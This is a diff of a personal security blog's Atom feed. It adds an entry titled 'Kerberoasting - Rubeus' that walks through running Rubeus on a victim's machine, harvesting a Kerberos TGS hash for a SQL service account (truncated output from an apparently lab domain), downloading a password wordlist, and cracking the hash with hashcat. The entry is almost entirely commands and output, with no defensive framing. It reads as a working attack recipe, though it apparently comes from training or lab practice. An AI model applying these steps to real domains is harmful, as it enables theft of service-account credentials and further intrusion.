@@ -4,13 +4,60 @@
  <title>Spindel</title>
  <link href="https://mvineza.github.io/spindel/atom.xml" rel="self"/>
  <link href="https://mvineza.github.io/spindel/"/>
- <updated>2022-03-07T20:06:33+08:00</updated>
+ <updated>2022-03-08T18:05:49+08:00</updated>
  <id>https://mvineza.github.io</id>
  <author>
    <name>spindel</name>
    <email>rell.vineza14@yahoo.com</email>
  </author>
 
+ 
+ <entry>
+   <title>Kerberoasting - Rubeus</title>
+   <link href="https://mvineza.github.io/spindel/2022/03/08/kerberoasting-rubeus"/>
+   <updated>2022-03-08T00:00:00+08:00</updated>
+   <id>https://mvineza.github.io/2022/03/08/Kerberoasting-Rubeus</id>
+   <content type="html">&lt;ul&gt;
+  &lt;li&gt;Launch rubeus on victim’s machine&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-batch highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;Rubeus&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.exe&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;kerberoast&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Wait for some hash to appear. Here is a truncated example.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-batch highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[*]&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;SamAccountName&lt;/span&gt;         : &lt;span class=&quot;kd&quot;&gt;SQLService&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[*]&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;DistinguishedName&lt;/span&gt;      : &lt;span class=&quot;kd&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;SQLService&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;Users&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;DC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;CONTROLLER&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;DC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[*]&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;ServicePrincipalName&lt;/span&gt;   : &lt;span class=&quot;kd&quot;&gt;CONTROLLER&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;/SQLService&lt;/span&gt;.CONTROLLER.local:30111
+&lt;span class=&quot;o&quot;&gt;[*]&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;PwdLastSet&lt;/span&gt;             : &lt;span class=&quot;m&quot;&gt;5&lt;/span&gt;/25/2020 &lt;span class=&quot;m&quot;&gt;10&lt;/span&gt;:28:26 &lt;span class=&quot;kd&quot;&gt;PM&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[*]&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;Supported&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;ETypes&lt;/span&gt;       : &lt;span class=&quot;kd&quot;&gt;RC4_HMAC_DEFAULT&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[*]&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;Hash&lt;/span&gt;                   : $krb5tgs$23$&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;SQLService&lt;/span&gt;$CONTROLLER.local$CONTROLLER&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;/SQLService&lt;/span&gt;.CONTROLLER.local...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Convert the hash block into single line.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;hash_block | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'\n'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; hash_single_line
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Get a modified rockyou &lt;a href=&quot;https://github.com/Cryilllic/Active-Directory-Wordlists/blob/master/Pass.txt&quot;&gt;here&lt;/a&gt; (or use the whole rockyou inside &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share/wordlists&lt;/code&gt;)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;nt&quot;&gt;-OL&lt;/span&gt; https://raw.githubusercontent.com/Cryilllic/Active-Directory-Wordlists/master/Pass.tx
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Crack using hashcat.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hashcat &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 13100 &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; 0 hash_single_line Pass.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</content>
+ </entry>
  
  <entry>
    <title>AS-REP Roasting using Impacket</title>
